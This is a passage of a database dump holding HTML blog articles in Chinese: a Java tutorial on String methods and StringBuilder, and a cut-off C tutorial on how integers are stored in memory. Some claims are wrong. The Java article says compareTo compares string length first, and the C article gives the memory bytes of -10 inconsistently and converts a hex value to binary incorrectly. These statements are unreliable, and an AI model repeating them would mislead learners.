/>56<br />57<br />58<br />59<br />60<br />参考<br />Java程序发送邮件的两种方法<br />设置SMTP服务器<br />java实现基于SMTP发送邮件的方法<br />java实现基于SMTP发送邮件的方法</p>', '', 9, ',16,7,', '原创', '公开', '已发布', '推荐', 0, '', '', 0, '2021-12-05 21:03:48', '2021-12-05 21:28:47');
INSERT INTO `article` VALUES (10, '【JavaSE系列】Java中的字符串之字符串常用方法与StringBuilder', 10, '概述', '<p>⭐️前面的话⭐️</p>\n<p>本篇文章带大家认识Java基础知识&mdash;&mdash;字符串类，在前面我们已经知道如何在Java中定义字符串和字符串常量池，本文将介绍Java字符串中的常用的方法以及StringBuilder。</p>\n<p>📒博客主页：未见花闻的博客主页<br />🎉欢迎关注🔎点赞👍收藏⭐️留言📝<br />📌本文由未见花闻原创，CSDN首发！<br />📆首发时间：🌴2021年12月3日🌴<br />✉️坚持和努力一定能换来诗与远方！<br />💭参考书籍：📚《Java核心技术》，📚《Java编程思想》，📚《Effective Java》<br />💬参考在线编程网站：🌐牛客网🌐力扣<br />博主的码云gitee，平常博主写的程序代码都在里面。<br />博主的github，平常博主写的程序代码都在里面。<br />🙏作者水平很有限，如果发现错误，一定要及时告知作者哦！感谢感谢！</p>\n<p>📌导航小助手📌<br />1.字符，字节与字符串<br />1.1字符与字符串<br />1.2字节与字符串<br />2.字符串的基本操作与方法<br />2.1字符串比较<br />2.2字符串查找<br />2.3字符串替换<br />2.4字符串拆分<br />2.5字符串截取<br />2.6字符串其他常用的操作方法<br />3.StringBuilder 与 StringBuffer<br />3.1StringBuilder 与 StringBuffer的区别<br />3.2StringBuilder拼接字符串<br />3.3StringBuilder相比String特有的方法<br />4.留给读者的练习</p>\n<p><br />1.字符，字节与字符串<br />1.1字符与字符串<br />序号 方法名 类型 描述<br />1 public String(char value[]) 构造方法 将字符数组中所有的内容变成字符串<br />2 public String(char value[], int offset, int count) 构造方法 将字符数组中的部分内容变成字符串 ，从索引offset开始，转换字符个数为count<br />3 public char charAt(int index) 普通方法 取得指定索引位置的字符，索引从0开始<br />4 public char[] toCharArray() 普通方法 将字符串转换成字符数组<br />import java.util.Arrays;</p>\n<p>public class Test5 {<br />public static void main(String[] args) {<br />char[] chArr = {\'a\', \'b\', \'c\', \'d\', \'e\'};<br />String str1 = new String(chArr);<br />System.out.println(str1);<br />String str2 = new String(chArr, 2,2);<br />System.out.println(str2);<br />System.out.println(str1.charAt(3));<br />char[] arr = str1.toCharArray();<br />System.out.println(Arrays.toString(arr));<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14</p>\n<p><br />1.2字节与字符串<br />序号 方法名 类型 描述<br />5 public String(byte bytes[]) 构造方法 将字节数组中所有内容变成字符串<br />6 public String(byte bytes[], int offset, int length) 构造方法 将字节数组中部分内容变为字符串<br />7 public byte[] getBytes() 普通方法 将字符串转换成字节数组<br />8 public byte[] getBytes(String charsetName) throws UnsupportedEncodingException 普通方法 编码转换处理<br />这四个方法要注意最后一个方法，参数charsetName只的是编码格式，常见的编码格式有utf-8，gbk等，除了这一点，还要注意使用该方法需要添加异常。</p>\n<p><br />怎么添加呢？点击带红色波浪线的方法名，Alt + 回车，会出现一个弹窗：</p>\n<p><br />选择第一个回车就可以了。（注：这是编译器IDEA的操作方法，还可以直接在代码最前面导入：import java.io.UnsupportedEncodingException;并在main方法后添加throws UnsupportedEncodingException）</p>\n<p>最后一个方法会根据提供的编码格式，编码成不同的字节数组，utf-8和gbk在编码英文字符是一样的，除英文字符外，编码就不相同了。</p>\n<p>import java.io.UnsupportedEncodingException;<br />import java.util.Arrays;<br />public class Test6 {<br />public static void main(String[] args) throws UnsupportedEncodingException {<br />byte[] bytes = {97,98,99,100,101,102,103};<br />String str1 = new String(bytes);<br />System.out.println(str1);<br />String str2 = new String(bytes, 2, 3);<br />System.out.println(str2);<br />byte[] arr = str1.getBytes();<br />System.out.println(Arrays.toString(arr));<br />String str3 = \"wjhw\";<br />String str4 = \"未见花闻\";<br />System.out.println(Arrays.toString(str3.getBytes(\"utf-8\")));//全英文字符串转字节编码，utf-8<br />System.out.println(Arrays.toString(str3.getBytes(\"gbk\")));//全英文字符串转字节编码，gbk<br />System.out.println(Arrays.toString(str4.getBytes(\"utf-8\")));//全中文字符串转字节编码，utf-8<br />System.out.println(Arrays.toString(str4.getBytes(\"gbk\")));//全英中文符串转字节编码，gbk<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19</p>\n<p><br />2.字符串的基本操作与方法<br />2.1字符串比较<br />序号 方法名 类型 描述<br />9 public boolean equals(Object anObject) 普通方法 判断字符串内容是否相等<br />10 public boolean equalsIgnoreCase(String anotherString) 普通方法 忽略大小写，判断字符串是否相等<br />11 public int compareTo(String anotherString) 普通方法 比较两个字符串大小<br />12 public int compareToIgnoreCase(String str) 普通方法 忽略大小写，比较两个字符串大小<br />public class Test7 {<br />public static void main(String[] args) {<br />String str1 = \"abcdef\";<br />String str2 = \"aBcDEf\";<br />System.out.println(str1.equals(\"abcdef\"));//true<br />System.out.println(str1.equals(\"abef\"));<br />System.out.println(\"============\");<br />System.out.println(str1.equals(str2));//false<br />System.out.println(str1.equalsIgnoreCase(str2));//true<br />System.out.println(\"============\");<br />String str3 = \"ca68\";<br />System.out.println(str3.compareTo(\"ca68\"));<br />System.out.println(str3.compareTo(\"da68\"));<br />System.out.println(str3.compareTo(\"ca67\"));<br />System.out.println(str3.compareTo(\"ca688\"));<br />System.out.println(str3.compareTo(\"ca6\"));<br />System.out.println(str3.compareToIgnoreCase(\"CA68\"));<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19</p>\n<p>c o m p a r e T o ( ) compareTo()compareTo()是一个可以区分大小关系的方法，是String方法里是一个非常重要的方法。<br />字符串的比较大小规则, 总结成三个字 &ldquo;字典序&rdquo; 相当于判定两个字符串在一本词典的前面还是后面. 先比较字符串长度，如果相同再比较第一个字符的大小(根据 unicode 的值来判定), 如果不分胜负, 就依次比较后面的内容。</p>\n<p>2.2字符串查找<br />序号 方法名 类型 描述<br />13 public boolean contains(CharSequence s) 普通方法 判断一个字符串中是否包含子串<br />14 public int indexOf(String str)<br />public int indexOf(int ch) 普通方法 从头开始查找指定字符串（字符）在字符串中的位置，查到了返回指定位置的开始索引，没有查找到返回-1<br />15 public int indexOf(String str, int fromIndex)<br />public int indexOf(int ch, int fromIndex) 普通方法 从指定索引位置开始查找指定字符串（字符在字符串中的位置，查到了返回指定位置的开始索引，没有查找到返回-1<br />16 public int lastIndexOf(String str)<br />public int lastIndexOf(int ch) 普通方法 从后向前查找指定字符串（字符）的位置<br />17 public int lastIndexOf(String str, int fromIndex)<br />public int indexOf(int ch, int fromIndex) 普通方法 从指定位置由后向前查找指定字符串（字符）位置<br />18 public boolean startsWith(String prefix) 普通方法 判断字符串是否以指定字符串开头<br />19 public boolean startsWith(String prefix, int toffset) 普通方法 判断指定位置字符串是否以指定字符串开头<br />20 public boolean endsWith(String suffix) 普通方法 判断是否以指定字符串结尾<br />public class Test8 {<br />public static void main(String[] args) {<br />String str1 = \"weijianhuawen\";<br />System.out.println(str1.contains(\"wei\"));//true<br />System.out.println(str1.contains(\"weihua\"));//false<br />System.out.println(\"============\");<br />System.out.println(str1.indexOf(\"jian\"));//3<br />System.out.println(str1.indexOf(\"hua\"));//7<br />System.out.println(str1.indexOf(\"wjhw\"));//-1<br />System.out.println(str1.indexOf(\'e\'));//1<br />System.out.println(str1.indexOf(\'u\'));//8<br />System.out.println(\"=============\");<br />System.out.println(str1.indexOf(\"hua\", 7));//7<br />System.out.println(str1.indexOf(\"jian\", 7));//-1<br />System.out.println(str1.indexOf(\'e\', 1));//1<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17</p>\n<p><br />public class Test9 {<br />public static void main(String[] args) {<br />String str2 = \"shiyuyuanfang\";<br />System.out.println(str2.lastIndexOf(\"yuan\"));//5<br />System.out.println(str2.lastIndexOf(\'a\'));//10<br />System.out.println(str2.lastIndexOf(\"yu\", 5));//5<br />System.out.println(str2.indexOf(\'a\', 8));//10<br />System.out.println(\"============\");<br />System.out.println(str2.startsWith(\"shi\"));//true<br />System.out.println(str2.startsWith(\"yuan\"));//false<br />System.out.println(str2.startsWith(\"yuan\", 5));//true<br />System.out.println(str2.endsWith(\"fang\"));//true<br />System.out.println(str2.endsWith(\"yuan\"));//false<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15</p>\n<p><br />2.3字符串替换<br />序号 方法名 类型 描述<br />21 public String replaceAll(String regex, String replacement)<br />public String replace(CharSequence target, CharSequence replacement) 普通方法 替换字符串中所有指定的内容<br />22 public String replaceFirst(String regex, String replacement) 普通方法 替换字符串中第一次出现的指定内容<br />String类实现了CharSequence接口，所以使用public String replace(CharSequence target, CharSequence replacement) 方法也能接受String型的参数。</p>\n<p><br />public class Test10 {<br />public static void main(String[] args) {<br />String str = \"Wisdom comes from diligence, and greatness comes from the ordinary\";<br />System.out.println(str.replaceAll(\"from\", \"源于\"));//得到的一个新对象，不会修改源字符串内容<br />System.out.println(str);<br />System.out.println(str.replace(\"from\", \"源于\"));//得到的一个新对象，不会修改源字符串内容<br />System.out.println(str);<br />System.out.println(str.replaceFirst(\"from\", \"源于\"));//得到的一个新对象，不会修改源字符串内容<br />System.out.println(str);<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11</p>\n<p>由于字符串是不可变对象, 替换不修改当前字符串, 而是产生一个新的字符串。</p>\n<p>2.4字符串拆分<br />序号 方法名 类型 描述<br />23 public String[] split(String regex) 普通方法 以指定字符串为标记将字符串全部拆分<br />24 public String[] split(String regex, int limit) 普通方法 以指定字符串为标记将字符串部分拆分，其中limit为新生成字符串数组的最大长度<br />import java.util.Arrays;</p>\n<p>public class Test11 {<br />public static void main(String[] args) {<br />String str = \"my email is weijianhuawen@163.com\";<br />String[] arr1 = str.split(\" \");<br />System.out.println(Arrays.toString(arr1));<br />String[] arr2 = str.split(\"@\");<br />System.out.println(Arrays.toString(arr2));<br />String[] arr3 = str.split(\" |@|\\\\.\");//有多个分隔符，可以使用|链接<br />System.out.println(Arrays.toString(arr3));<br />String[] arr4 = str.split(\"\");<br />System.out.println(Arrays.toString(arr4));//没有分隔符，将字符串全部分开<br />//多个分隔符分割还可以以多次分割的形式分开<br />String[] res = str.split(\"@\");<br />for (int i = 0; i &lt; res.length; i++) {<br />String[] temp = res[i].split(\" \");<br />for (int j = 0; j &lt; temp.length; j++) {<br />System.out.print(temp[j] + \" \");<br />}<br />}<br />System.out.println();<br />String[] arr5 = str.split(\" \", 2);<br />System.out.println(Arrays.toString(arr5));<br />String[] arr6 = str.split(\" \", 3);<br />System.out.println(Arrays.toString(arr6));<br />String[] arr7 = str.split(\" \", 4);<br />System.out.println(Arrays.toString(arr7));<br />String[] arr8 = str.split(\" \", 100);//如果数组限制数超过实际最大分割字符串的数组长度，将输出实际分割的长度最大的字符串数组<br />System.out.println(Arrays.toString(arr8));<br />String str2 = \"djfj\\\\j\\\\p\\\\]a\";<br />System.out.println(Arrays.toString(str2.split(\"\\\\\\\\\")));//由于\\是特殊字符需要\\\\\\\\才能表示一个普通的\\<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25<br />26<br />27<br />28<br />29<br />30<br />31<br />32<br />33<br />34</p>\n<p><br />注意事项:</p>\n<p>字符\"|\",\"*\",\"+&ldquo;都得加上转义字符，前面加上&rdquo;\".<br />而如果是\"\\\"，那么就得写成\"\\\\\\\\\".<br />如果一个字符串中有多个分隔符，可以用\"|\"作为连字符.<br />2.5字符串截取<br />序号 方法名 类型 描述<br />25 public String substring(int beginIndex) 普通方法 从指定位置截取字符串到结尾<br />26 public String substring(int beginIndex, int endIndex) 普通方法 截取字符串指定区间的内容，左闭右开<br />public class Test12 {<br />public static void main(String[] args) {<br />String str = \"weijianhuawen\";<br />System.out.println(str.substring(3));<br />System.out.println(str.substring(7));<br />System.out.println(str.substring(0, 3));//左闭右开<br />System.out.println(str.substring(7, 10));<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9</p>\n<p><br />2.6字符串其他常用的操作方法<br />序号 方法名 类型 描述<br />27 public String trim() 普通方法 去除字符串左右两边的空格，保留字符串中间的空格<br />28 public String toLowerCase() 普通方法 将字符串中所有的字母转成小写<br />29 public String toUpperCase() 普通方法 将字符串中所有的字母转成大写<br />30 public native String intern() 普通方法 字符串手动入池<br />31 public String concat(String str) 普通方法 字符串拼接，相当于&ldquo;+&rdquo;，不会自动入池<br />32 public int length() 普通方法 获取字符串长度<br />33 public boolean isEmpty() 普通方法 判断字符串是否是空字符串（不是null，而是长度为0的字符串）<br />public class Test {<br />public static void main(String[] args) {<br />String str1 =\" I hava a pen. \";<br />System.out.println(str1.trim());<br />System.out.println(\"============\");<br />String str2 = \"apple\";<br />System.out.println(str2.toUpperCase());<br />System.out.println(\"============\");<br />String str3 = \"APP\";<br />System.out.println(str3.toLowerCase());<br />System.out.println(\"============\");<br />String str4 = \"weijianhuawen\";<br />System.out.println(str4.length());<br />System.out.println(\"============\");<br />String str5 = \"cs\";<br />String str6 = \"dn\";<br />System.out.println(str5.concat(str6));<br />System.out.println(\"============\");<br />String str7 = \"\";<br />System.out.println(str7.isEmpty());<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22</p>\n<p><br />3.StringBuilder 与 StringBuffer<br />3.1StringBuilder 与 StringBuffer的区别<br />任何字符串常量都是String类，该类的对象内容是不可以修改的，为了方便字符串的修改，Java提供了StringBuilder和StringBuffer，这两个类与String类是不相同的，也没有继承关系，所以String类引用是不能接收StringBuilder和StringBuffer对象的，同理StringBuilder和StringBuffer引用也不能接收String类对象。</p>\n<p>对于StringBuilder和StringBuffer两者大同小异，前者未同步处理，适合在单线程下使用，后者采用线程同步，适合在多线程下使用。这一点在源码上有体现：</p>\n<p><br />在StringBuffer中，区别与StringBuilder，每个方法前面有一个synchronized修饰，该关键字表示线程同步，起到上锁解锁的作用，保证多线程安全。除了这一点，其他的方面StringBuilder 与 StringBuffer都是一样的，所以本文全部以StringBuilder为例，StringBuffer用法和StringBuilder一模一样。</p>\n<p>3.2StringBuilder拼接字符串<br />在进行字符串的拼接的时候，由于字符串是不可变的，会先将Sting类转换成StringBuilder类，然后利用StringBuilder类的append方法，将字符串拼接起来，这里的拼接不是形成一个新对象，而是在原有对象上修改，最后会自动将StringBuilder类的字符串通过toString方法转换成String类，这时候得到的是一个新的字符串对象。</p>\n<p>public class Test1 {<br />public static void main(String[] args) {<br />String str1 = \"xue\";<br />String str2 = \"xi\";<br />String str = str1 + str2;<br />System.out.println(str);<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8</p>\n<p><br />这也就是说使用+号拼接字符串，需要new对象，如果有很多的字符串或字符需要拼接，每一次拼接都需要new一个StringBuilder对象和String对象，这样就会产生大量的对象，那程序的性能肯定会受到影响，而使用StringBuilder类的append方法就能解决该问题，因为使用StringBuilder类的append方法并不会产生新对象，减少了对象的产生，自然性能也得到了优化。<br />看下面一段代码，由于不断拼接，产生了多个新对象：</p>\n<p>public class Test13 {<br />public static void main(String[] args) {<br />String str = \"abc\";<br />for (int i = 1; i &lt;= 9; i++) {<br />str += i;<br />}<br />System.out.println(str);<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9</p>\n<p>&nbsp;</p>\n<p><br />通过反编译，上述代码相当于：</p>\n<p>public class Test14 {<br />public static void main(String[] args) {<br />String str = \"abc\";<br />for (int i = 1; i &lt;= 9; i++) {<br />StringBuilder stringBuilder = new StringBuilder();<br />stringBuilder.append(str);<br />stringBuilder.append(i);<br />str = stringBuilder.toString();<br />}<br />System.out.println(str);<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12</p>\n<p><br />每进入一次循环，都new了一个新对象。如果我们会自己使用StringBuilder类，可以将这个代码优化为：</p>\n<p>public class Test15 {<br />public static void main(String[] args) {<br />String str = \"abc\";<br />StringBuilder stringBuilder = new StringBuilder();<br />stringBuilder.append(str);<br />for (int i = 1; i &lt;= 9; i++) {<br />stringBuilder.append(i);<br />}<br />str = stringBuilder.toString();<br />System.out.println(str);<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />将程序优化后，只产生了一个新对象，程序的开销大大减少。</p>\n<p><br />String和StringBuffer最大的区别在于： String的内容无法修改，而StringBuffer的内容可以修改。频繁修改字符串的情况考虑使用StingBuffer。</p>\n<p>3.3StringBuilder相比String特有的方法<br />我们先来从源码上入手，StringBuilder本质上也是一个字符数组，但是它的权限是包访问（默认）权限，没有final关键字修饰，证明了StringBuilder类是可变的。<br />将S t r i n g StringString转S t r i n g B u i l d e r StringBuilderStringBuilder有两种方法：</p>\n<p>使用带参数的S t r i n g B u i l d e r StringBuilderStringBuilder的构造方法，将字符串作为参数。<br />调用S t r i n g B u i l d e r StringBuilderStringBuilder的a p p e n d appendappend方法。<br />相反S t r i n g B u i l d e r StringBuilderStringBuilder转S t r i n g StringString可以调用S t r i n g B u i l d e r StringBuilderStringBuilder的t o S t r i n g toStringtoString方法。</p>\n<p>&nbsp;</p>\n<p><br />public class Test16 {<br />public static void main(String[] args) {<br />StringBuilder stringBuilder1 = new StringBuilder(\"weijianhuawen\");<br />System.out.println(stringBuilder1.toString());<br />stringBuilder1.delete(7,10);//删除hua ，区间是左闭右开<br />System.out.println(stringBuilder1.toString());<br />System.out.println(\"============\");<br />StringBuilder stringBuilder2 = new StringBuilder(\"nature\");<br />System.out.println(stringBuilder2.toString());<br />stringBuilder2.insert(6,2021);//在最后插入2021<br />System.out.println(stringBuilder2.toString());<br />System.out.println(\"============\");<br />StringBuilder stringBuilder3 = new StringBuilder(\"csdn\");<br />System.out.println(stringBuilder3.toString());//逆序字符串<br />System.out.println(stringBuilder3.reverse().toString());<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17</p>\n<p><br />4.留给读者的练习<br />最近有同学问了我一道相关字符串的习题，现将这道习题分享给大家，以巩固相关字符串的知识：</p>\n<p>从键盘中输入一个字符串，如果输入的字符串中有除了数字、字母以外的其他符号，则输出提示信息\"输入的数据不符合条件，请重新输入新的字符串!\"，直至输入符合的字符串。如果满足条件，输入提示信息\"输入的数据符合条件\"，并实现如下功能∶<br />1、将所有字符数字保存到字符串s1中并输出，统计出字符数字的个数。<br />2、将所有字母保存到字符串s2中并输出，统计出字母的个数。<br />3、使用concat()方法将字符串s2拼接到字符串s1后形成新的字符串s3，并输出。<br />4、使用substring()方法截取子串，子串保存到字符串s4。<br />5、使用toLowerCase()方法将字符串s3中所有大写字符转换为小写，保存到字符串s5。<br />6、使用equals()方法比较s3和s5两个字符串是否相等。思考∶若忽略大小写则如何实现比较?</p>\n<p>如果不太会做或想知道博主怎么做的可以联系博主并与博主交流。<br />&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「未见花闻」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/m0_59139260/article/details/121665905j</p>', '', 1, ',7,', '原创', '公开', '已发布', '推荐', 988, 'Hot', '', 0, '2021-12-05 21:41:54', '2021-12-05 21:41:54');
INSERT INTO `article` VALUES (11, '深入理解《有理数》在电脑中是怎么存储的', 10, '概述', '<p>目录<br />前言<br />🌳 数据在内存中以什么形式存储<br />🌳十六进制表示法<br />二进制如何转换成16进制<br />🌳这个16进制位的数字如何在内存中表示？<br />大、小端字节序<br />关于大小端之争的有趣故事<br />🌳数据类型的详细介绍<br />整型类型（剖析）<br />浮点数类型（剖析）<br />构造类型（了解）<br />指针类型（了解）<br />空类型（了解）<br />🌳整型在内存中的存储：原码，反码，补码<br />深入理解原码，反码，补码<br />1.先得到-1原来的原、反、补码<br />2.发生截断<br />3.发生整形提升<br />🌳浮点型在内存中的存储<br />怎么用二进制表示小数<br />怎么将二进制小数存入内存<br />IEEE浮点表示方法<br />试图将5.75按照IEEE标准存入变量a(32bit)<br />试图将5.75读取并printf<br />总结<br />❤️ ：热爱编程学习，期待一起交流。<br />🙏：博主是河牧院大一在读学生，水平有限，如发现错误，期待指点！（2466200050）<br />🌳：以下是我对数据在内存中的存储的拙见，期待大佬们指教。</p>\n<p>前言<br />这篇博客结合代码和理论知识对数据在内存中的存储做了深入的分析。毕竟只讲理论不实践分析就是耍流氓。</p>\n<p>看完这篇你就了解数据在内存中是如何存储的啦。</p>\n<p>如果你想更深入了解，强烈推荐计算机专业必看的一本书《深入理解计算机系统》</p>\n<p><br />这本书的第二章的信息存储讲的就是我这篇博客要叙述的。</p>\n<p>对这本书感兴趣的可以联系我给你发个电子版的。</p>\n<p>虽然不看这本书也能写代码。但是看了之后就有种被打通任督二脉的感觉。因为那时候已经了解他的本质。再次书写代码的时候能够得心应手。</p>\n<p>编程三种境界：<br />看代码是代码，看代码是内存，看代码还是代码。<br />博主正在朝着看代码是内存的道路前进！</p>\n<p>从我们初识C语言开始，我们前几课就已经学了各种各样的数据类型。但是我们可能只是了解了这些数据类型怎么去使用，比如这里，int a = 10；我们定义了一个整型变量a，它的值是10。但是我们并不知道这个数字10怎么在内存中存储的。</p>\n<p><br />🌳 数据在内存中以什么形式存储<br />首先，要设置一个问题，引出接下来要讲的内容。<br />以32位机器为例<br />1.我们定义了一个整型变量a。int a = 10；那么这个10进制的数字10，是怎么在计算机中存储的呢？<br />2.如果是以二进制的方式存储，那么它是怎么显示的？<br />大多数计算机使用一个字节（1byte=8bit），作为最小的可寻址的存储器单位，而不是在存储器中访问单独的位（bit）。<br />接下来，我们讲述编译器和运行时系统是如何将存储器空间划分为更可管理的单元。<br />🌳十六进制表示法<br />一个字节由八个位组成。在二进制表示法中，他的取值范围是00000000~11111111（也就是十进制的0 到 255）<br />由于二进制表示法太冗长，十进制表示法与位模式的互相转化又很麻烦。<br />所以诞生了以16进制（HEX）来表示位模式在内存中表示.<br />它是用0~9以及用字符A到F来表示16个值，也就是表示0到15这16个数字。<br />在C语言中。以0x或者0X开头的数字就是16进制。字母A到F即可大写也可以小写。<br />二进制如何转换成16进制</p>\n<p><br />每四个二进制位可以转换成一个16进制的数字。<br />例如：给你一个173A4C。如何转换成二进制？<br />如下所示<br />这样我们就得到了32位的二进制表示00010111001110101001100</p>\n<p>🌳这个16进制位的数字如何在内存中表示？<br />大、小端字节序<br />假设让数字0x11223344放在内存中 ，那他是如何表示的呢？<br />实际内存中存的就是是它的二进制序列，只是内存中的表示一般是16进制。<br />我们打开vs，切换到内存。<br />#include&lt;stdio.h&gt;<br />int main()<br />{<br />int a = 0x11223344;<br />return 0;<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />我们以这段代码为例。我们进入调试。使用&amp;操作符拿到a的地址。然后在内存中的该地址上的数是如何表示。</p>\n<p>可以看到此时程序刚从主函数入口进入，变量a在内存中已经开辟好了空间。但还没有开始执行下一条int a = 0x11223344的赋值操作。所以a的值是一个随机值1.<br />我们接着执行</p>\n<p>这里还没有执行int a = 0x11223344的赋值操作，但是已经为main函数开辟好了栈帧空间。把局部变量都赋值为了cc cc cc cc，所以a这时候还是随机值-858993460。</p>\n<p>继续执行了下一步赋值操作0x11223344的十进制数就是287454020.<br />可以看到此时在内存中a的地址为 44 33 22 11<br />正好是0x11 22 33 44 倒着写过来的。<br />所以在内存中的存储就是把16进制位按每一个字节（即八个bit位）倒着写上去就行了。<br />我们来看看官方怎么描述。<br />把某些机器选择在存储器上按照从最低有效字节到最高有效字节的顺序存储对象的方法叫做小端法。（我们现在大多数用这种方法）<br />而另一些机器则按照从最高有效字节到最低有效字节的顺序存储<br />对象的方法叫做大端法</p>\n<p>特别注意：字节在内存中的存储是从低地址向高地址存储的*</p>\n<p>例如： 用小端法存储0x11 22 33 44，11是一个字节，22,33,44都是一个字节（即二进制中的八个bit位）。11是最高字节位，44是最低字节位。按照从最低有效字节到最高有效字节的顺序存储0x11<br />22 33 44得到 在内存中表示是44 33 22 11.<br />关于大小端之争的有趣故事</p>\n<p><br />由以上的铺垫，这里我们就要步入正题啦<br />🌳数据类型的详细介绍<br />接下来先介绍一下都有什么数据类型，然后我们再对其中的整型类型和浮点类型进行剖析。由于博主水平有限。其他暂时了解即可。<br />整型类型（剖析）<br />每个整型可以具体划分为有符号整型和无符号整型。<br />有符号数的特点<br />有正负之分。取值范围从负数到正数<br />二进制位的最高位是符号位。0表示正数，1则表示负数。<br />无符号数的特点<br />全是正数，无正负之分。取值范围从0到正数。<br />二进制位的最高位不是符号位，它的最高位仅用表示该数的大小<br />32位机器上C语言的整型数据类型的典型取值范围。</p>\n<p>我们可以看到有unsigned全是正数，就入上面我们所说的那样。<br />char<br />unsigned char//无符号字符类型<br />signed char//有符号<br />short<br />unsigned short [int]<br />signed short [int]<br />int<br />unsigned int<br />signed int<br />long<br />unsigned long [int]<br />signed long [int]<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />浮点数类型（剖析）<br />float<br />double<br />1<br />2<br />构造类型（了解）<br />&gt; 数组类型<br />&gt; 结构体类型 struct<br />&gt; 枚举类型 enum<br />&gt; 联合类型 union<br />1<br />2<br />3<br />4<br />指针类型（了解）<br />int *pi;<br />char *pc;<br />float* pf;<br />void* pv;<br />1<br />2<br />3<br />4<br />空类型（了解）<br />void 表示空类型（无类型）<br />通常应用于函数的返回类型、函数的参数、指针类型。<br />1<br />2<br />🌳整型在内存中的存储：原码，反码，补码<br />我们前面说到一个变量a=0x11223344在内存中是如何存储的了。<br />但是负数怎么存储呢？<br />例如：<br />int a = 10;<br />int b = -10;<br />1<br />2<br />这个int b = -10怎么在内存中存储呢？<br />我们知道为 b分配四个字节的空间。<br />那如何存储？<br />下面了解下面的概念：<br />计算机中的整数有三种表示方法，即原码、反码和补码。<br />三种表示方法均有符号位和数值位两部分<br />符号位都是用0表示&ldquo;正&rdquo;，用1表示&ldquo;负&rdquo;，而数值位负整数的三种表示方法各不相同。<br />原码<br />直接将二进制按照正负数的形式翻译成二进制就可以。<br />反码<br />将原码的符号位不变，其他位依次按位取反就可以得到了。<br />补码<br />反码+1就得到补码。</p>\n<p>重点：<br />正数的原、反、补码都相同。<br />负数的原、反、补码不相同。<br />对于整形来说：数据存放内存中其实存放的是补码。<br />为什么呢？<br />在计算机系统中，数值一律用补码来表示和存储。原因在于，使用补码，可以将符号位和数值域统<br />一处理；<br />同时，加法和减法也可以统一处理（CPU只有加法器）此外，补码与原码相互转换，其运算过程是相同的，不需要额外的硬件电路。<br />我们拿上面的a = 10和 b = -10 为例，来探究数在内存中是如何存储的。</p>\n<p>可以看到a的值是00 00 00 0a。a是用10进制表示就是数字10。<br />b的值是ff ff ff fa，转化为10进制就是4294967290，天呐好大的数字！为什么不是-10呢？<br />让我们来探究一下<br />00000000 00000000 00000000 00001010 二进制表示的a<br />11111111 11111111 11111111 11110110 二进制表示的b<br />1<br />2<br />对于a ，因为数据在内存中存放的是补码。但a为正数，原，反，补码都相同。所以内存中存的就是10的二进制原码。<br />00000000 00000000 00000000 00001010 数字10的二进制原码<br />转化成16进制就是00 00 00 0a<br />1<br />2<br />对于b， b是一个负数-10，将-10放进内存中放的是-10的补码。<br />我们经过对原码符号位不变，其他位按位取反得到反码，反码进行+1，就得到了补码<br />10000000 00000000 00000000 00001010 负10的原码<br />11111111 11111111 11111111 11110101 负10的反码（符号位不变，其他位按位取反）<br />11111111 11111111 11111111 11110110 补码 = 反码+1<br />1<br />2<br />3<br />我们得到了-10的补码，发现和图片上的一样</p>\n<p>转化成16进制的确是ff ff ff f6。<br />但为什么打印出来的是-10呢？而不是他的二进制补码对应的数呢<br />因为打印的话是以原码的形式打印的，但在内存中存储是以<br />补码形式存储的<br />深入理解原码，反码，补码<br />接下来我们用实例来理解原反补。<br />下面程序运行的结果是什么？<br />一共三部曲<br />#include&lt;stdio.h&gt;<br />int main()<br />{<br />char a = -1;//默认为有符号<br />signed char b = -1;//有符号char类型<br />unsigned char c = -1;//无符号char类型<br />printf(\"a=%d,b=%d,c=%d\", a, b, c);//a = -1,b = -1,c = 255<br />return 0;<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />1.先得到-1原来的原、反、补码<br />剖析，以下是-1这个整数的（4个字节）原反补码。<br />10000000 00000000 00000000 00000001 原码<br />11111111 11111111 11111111 11111110 反码<br />11111111 11111111 11111111 11111111 补码//（补码就是反码+1）<br />1<br />2<br />3<br />2.发生截断<br />我们拿到了-1这个整数的补码。因为内存中存的是补码，现在把4个字节的整型数字负1放进char类型变量a中的话，就要发生截断，只取低一个字节。即11111111（补码）。<br />11111111 截断后放在a中的补码<br />1<br />3.发生整形提升<br 